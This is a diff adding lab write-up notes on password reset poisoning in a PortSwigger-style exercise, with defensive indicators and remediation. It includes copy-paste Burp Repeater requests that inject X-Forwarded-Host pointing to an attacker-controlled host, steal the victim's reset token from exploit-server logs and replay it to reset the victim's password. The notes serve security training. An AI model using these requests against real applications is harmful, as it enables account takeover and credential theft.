@@ -1270,3 +1270,189 @@ username=carlos&password=P@ssw0rd123!&confirm=P@ssw0rd123!
 - Save PoC: raw GET, edited POST, successful login response + screenshot.
 
 ---
+
+# Password reset poisoning — Notes (PortSwigger-style)
+
+---
+
+## 🔹 One-line summary
+Abuse forwarded headers (e.g. X-Forwarded-Host, X-Forwarded-Proto) to make the application generate password-reset links that point to an attacker-controlled host. Capture the token from the attacker host and use it against the real reset endpoint to reset the victim’s password.
+
+---
+
+## 🔹 What is this issue?
+When an app builds absolute reset URLs using untrusted forwarded headers, an attacker can control the root/host portion of the generated link. If the app sends that crafted link to the attacker (or an attacker can intercept it), the attacker obtains the victim’s reset token and can use it to reset the victim’s password on the real site.
+
+---
+
+## 🔹 Why this matters (real-world risk)
+- Attackers can reset arbitrary users’ passwords without email compromise.
+- Bypasses email security assumptions and phishing protections.
+- Leads to account takeover, data theft, privilege escalation.
+- Simple to exploit when reverse proxies / frameworks honor forwarded headers without validation.
+
+---
+
+## 🔹 High-value places / patterns to check
+- POST /forgot-password, POST /reset, GET /reset?token=...
+- App code that constructs absolute URLs using Host, X-Forwarded-Host, or X-Forwarded-Proto.
+- Templates / email builders that insert a full link (scheme + host + path).
+- Reverse proxies / load balancers that accept forwarded headers from untrusted sources.
+
+---
+
+## 🔹 How to detect it quickly (fast recon)
+1. Trigger a password reset for a test account and capture the legitimate reset email/link. Note the URL structure and parameter name (example: temp-forgot-password-token or token).
+2. Send the same reset request while adding X-Forwarded-Host: <your-exploit-host> and X-Forwarded-Proto: https in the request headers (keep Host: as the real host).
+3. Check the exploit host (exploit server access logs). If a reset link to your exploit host appears there, the app used the forwarded header to build the link.
+
+---
+
+## 🔹 Exact step-by-step lab methodology (do not skip steps)
+> Work only in an authorized lab environment.
+### 1) Preparation
+- Open Burp Suite (Proxy ON). Use a fresh browser/private window.
+- Note test account(s): attacker wiener, victim carlos (replace with lab credentials).
+- Note the exploit-server hostname provided by the lab (e.g. <EXPLOIT_HOST>.exploit-server.net).
+
+---
+
+### 2) Capture a baseline reset request & email
+1. In browser, request a password reset for the attacker account (wiener) via the app’s Forgot password UI.
+2. In Burp → Proxy → HTTP history, locate the POST (or GET) request that triggered the reset email. Right-click → Send to Repeater (save a copy).
+3. Open the lab email / inbox and copy the legitimate reset link (this proves normal behavior). Save it for later comparison.
+
+---
+
+### 3) Modify the reset request to poison the link
+- In Repeater, load the captured POST /forgot-password request (the one for wiener).
+- Edit the request body so the username is the victim (e.g. username=carlos), OR leave body as needed for the lab flow — the goal is to get the server to generate a reset link for carlos.
+- Add headers to the request (leave Host: unchanged — keep it pointing at the real lab host):
+
+X-Forwarded-Host: <EXPLOIT_HOST>
+X-Forwarded-Proto: https
+
+(If you need to test other forwarded headers, add Forwarded: or other variants as appropriate.)
+
+- Send the modified request.
+
+---
+
+### 4) Inspect exploit server access log and extract token
+- Open the exploit server panel provided by the lab (Exploit Server → Access log).
+- Look for an incoming request (GET/POST) that contains the reset token parameter (e.g. temp-forgot-password-token= or token=) in the URL or body.
+- Copy the stolen token (URL-decode if necessary).
+
+---
+
+### 5) Use stolen token with the real reset URL
+- Take the legitimate reset URL you saved earlier (the one that points to the real lab host).
+- Replace the token value in that legitimate URL with the stolen token captured from the exploit host. Example:
+
+https://<LAB_HOST>/reset?temp-forgot-password-token=<STOLEN_TOKEN>
+
+- Open that modified real reset URL in your browser or Repeater.
+
+---
+
+### 6) Complete the reset and verify
+- Set a new password for carlos on the real reset page and submit.
+- Open a fresh private browser and attempt to log in as carlos with the new password.
+- If login succeeds and you can access carlos’s account, the lab is solved — the reset token was poisoned and reused.
+
+---
+
+## 🧾 Proof / Evidence
+
+Below are the evidences captured during the exploitation process, attached under the ../images/ directory for proper referencing.
+
+1. *Screenshot 1 — Baseline forgot-password (wiener)*  
+   ../images/password-reset-poisoning-forgot-wiener.png  
+   Description: Captured the baseline POST /forgot-password request for *wiener*, showing the legitimate email trigger and the normal reset flow.
+
+2. *Screenshot 2 — Poisoned request in Repeater (X-Forwarded-Host added)*  
+   ../images/password-reset-poisoning-repeater-poisoned.png  
+   Description: Shows the modified *Repeater* request with headers X-Forwarded-Host: <EXPLOIT_HOST> and X-Forwarded-Proto: https, changing the username to *carlos*.
+
+3. *Screenshot 3 — Exploit server access log (stolen token)*  
+   ../images/password-reset-poisoning-exploitserver-log.png  
+   Description: Access log entry from the exploit server showing the captured reset token (temp-forgot-password-token=<STOLEN_TOKEN>).
+
+4. *Screenshot 4 — Real reset URL with replaced token*  
+   ../images/password-reset-poisoning-real-url-replaced.png  
+   Description: Demonstrates the *legitimate reset URL* where the stolen token from the exploit server replaced the original token for *carlos*.
+
+5. *Screenshot 5 — Successful login as carlos after reset*  
+   ../images/password-reset-poisoning-carlos-logged-in.png  
+   Description: Proof of exploitation success — logged in as *carlos* after resetting the password using the stolen token.
+
+---
+
+### 🔹 Repeater / PoC templates (copy/paste & edit)
+
+*Baseline POST (captured from browser; send for wiener initially)*
+
+POST /forgot-password HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+username=wiener
+
+*Poisoned POST (send to attacker host via forwarded headers; change username to victim)*
+
+POST /forgot-password HTTP/1.1
+Host: <LAB_HOST>
+X-Forwarded-Host: <EXPLOIT_HOST>
+X-Forwarded-Proto: https
+Content-Type: application/x-www-form-urlencoded
+
+username=carlos
+
+*Real reset URL (replace token)*
+Open in browser or Repeater after replacing <STOLEN_TOKEN>:
+
+https://<LAB_HOST>/reset?temp-forgot-password-token=<STOLEN_TOKEN>
+
+*Reset POST (if form sends POST) — example:*
+
+POST /reset HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+token=<STOLEN_TOKEN>&password=NewP@ssw0rd!&confirm=NewP@ssw0rd!
+
+
+---
+
+## 🔹 Common responses & interpretation
+- Exploit host receives reset link containing token → success: the app used forwarded headers.
+- Real reset page accepts stolen token and lets you set a password → exploit complete.
+- Real reset page rejects token → server may bind token to session or validate host — not vulnerable via this technique (note in report).
+
+---
+
+## 🔹 Detection indicators (what defenders see)
+- Reset emails / generated links pointing to unexpected hosts.
+- Incoming requests with X-Forwarded-* from untrusted sources.
+- Exploit-server logs with reset token parameters.
+- Unusual pattern: reset requests followed shortly by resets for other accounts from the same IP.
+
+---
+
+## 🔹 Remediation checklist (what to recommend)
+- Do not build security-sensitive absolute URLs from untrusted forwarded headers. Use canonical server config (trusted proxy list) or a fixed base host.
+- Validate and normalize forwarded headers only when they come from a trusted reverse proxy.
+- Bind reset tokens to the intended account server-side and mark tokens single-use.
+- Short token TTLs and robust logging / alerting on reset link generation.
+- Send reset links via validated email channels and monitor for forwarded-host anomalies.
+
+---
+
+## 🔹 Pentest checklist (copyable)
+1. Capture legitimate reset email & URL for wiener.
+2. Send modified POST /forgot-password with X-Forwarded-Host: <EXPLOIT_HOST> and username=carlos to Repeater.
+3. Check exploit-server access log for stolen token.
+4. Insert stolen token into the real reset URL; open and reset carlos’s password.
+5. Verify login as carlos. Save PoC.
+
+---
